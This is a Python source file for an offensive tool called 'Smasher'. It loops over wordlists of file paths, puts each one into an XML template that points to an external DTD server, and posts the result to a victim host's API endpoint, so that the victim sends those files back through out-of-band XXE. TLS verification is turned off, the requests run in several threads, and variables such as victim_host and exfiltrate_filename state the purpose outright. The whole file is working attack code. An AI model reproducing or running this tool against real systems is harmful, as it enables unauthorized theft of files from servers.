"""
Simple tcp client that reads a template file, replaces contained tags and sends the contents to a destination server.
Results are sent to a message queue.
"""
from socket import *
import base64
import sys
from ssl import *
import requests
from KissKissieBase import KissKissieBase
import os
requests.packages.urllib3.disable_warnings()
from Queue import Queue
import time
from threading import Thread

class Smasher(KissKissieBase):
    def __init__(self, 
            queue, 
            victim_host, 
            dtd_server, 
            dtd_port=80, 
            port=80, 
            template_name='', 
            dtd_filename='', 
            exfiltrate_wordlists='', 
            tls=True, 
            debug=False, 
            thread_limit=1, 
            ):
        super(Smasher, self).__init__(queue, debug)
        self._port = port # Victim port
        self._buffer_size = 1024
        self._template_name = template_name
        self._dtd_filename = dtd_filename
        self._exfiltrate_filename = None
        self._exfiltrate_wordlists = exfiltrate_wordlists
        self._victim_host = victim_host
        self._dtd_server = dtd_server
        self._dtd_port = dtd_port
        self._isTLS = tls
        self.debug=False
        self.thread_limit=thread_limit
        self.scanQueue = Queue()
    
    def getNextWordlist(self):
        '''
        Returns a list of filenames within a specified directory.
        '''
        if os.path.isdir(self._exfiltrate_wordlists):
            files = os.listdir(self._exfiltrate_wordlists)
            for filename in files:
                yield os.path.join(self._exfiltrate_wordlists, filename)
        else:
            raise Exception("Wordlist directory does not exist.%s" %self._exfiltrate_wordlists)

    def getNextExfiltrateFilename(self):
        '''
        Returns the contents of every file within a specified directory.
        '''
        for file in self.getNextWordlist():
            with open(file, 'r') as f:
                for line in f.xreadlines():
                    yield line.strip()
        
    def run(self, queue_message=None):
        '''
        Expecting a local text file containing a list of exfiltrate filenames and paths for the victim host to send back to us.
        '''
        super(Smasher, self).run()
        #Spawn number of scanner threads
        self.scanQueue.maxsize = self.thread_limit
        #spawn scanning threads
        for n in range(self.thread_limit):
            thread = Thread(target=self.requestXss)
            thread.daemon = True
            thread.start()
        
        for exfiltrate_filename in self.getNextExfiltrateFilename():
            print exfiltrate_filename
            # Send multiple requests to victim_host specifying exfiltrate filename
            self.scanQueue.put(exfiltrate_filename, True)
        print "Smasher complete."

    def requestXss(self):
        http_method = 'http'
        if self._isTLS:
            http_method = 'https'
        headers = {'Content-Type': 'application/xml;charset=UTF-8', 'Accept':'application/xml'}
        url = "%s://%s:%s/api/now/v1/rfc"%(http_method, self._victim_host, self._port)
        while True:
            queue_message = {}
            with self.lock:
                queue_message['exfiltrate_filename'] = self.scanQueue.get() #Expecting to receive filename for exfil
                if queue_message['exfiltrate_filename'] :
                    queue_message['scan_id']  = super(Smasher, self).generateScanID()
                    queue_message['data'] = queue_message['exfiltrate_filename'] 
                    queue_message['victim_host'] = self._victim_host
                    queue_message['sender'] = self._queue_message['sender']
                    self.sendMessageToQueue(queue_message)
                    body_data = self.getTemplate(self._template_name, scan_id=queue_message['scan_id'], exfiltrate_filename=queue_message['exfiltrate_filename'])
            try:
                requests.post(url, verify=False, data=body_data, headers=headers, timeout=5)
            except requests.exceptions.RequestException as e: 
                if self.debug == True:
                    print e
#                    self._queue_message['data'] = "Smasher connected to %s but didn't return in time." %self._victim_host
            finally:
                self.scanQueue.task_done()
            
    def getTemplate(self, template_name, scan_id='uuid', exfiltrate_filename='/etc/blank'):
        if scan_id == 'uuid':
            scan_id = self._queue_message['scan_id']
        if exfiltrate_filename == '/etc/blank':
            exfiltrate_filename = self._exfiltrate_filename
        template_tags = {
            'scan_id':scan_id, 
            'exfiltrate_filename':exfiltrate_filename, 
            'dtd_filename':self._dtd_filename, 
            'victim_host':self._victim_host, 
            'dtd_server':self._dtd_server, 
            'dtd_port':self._dtd_port, 
        }
        return super(Smasher, self).getTemplate(template_name, template_tags)
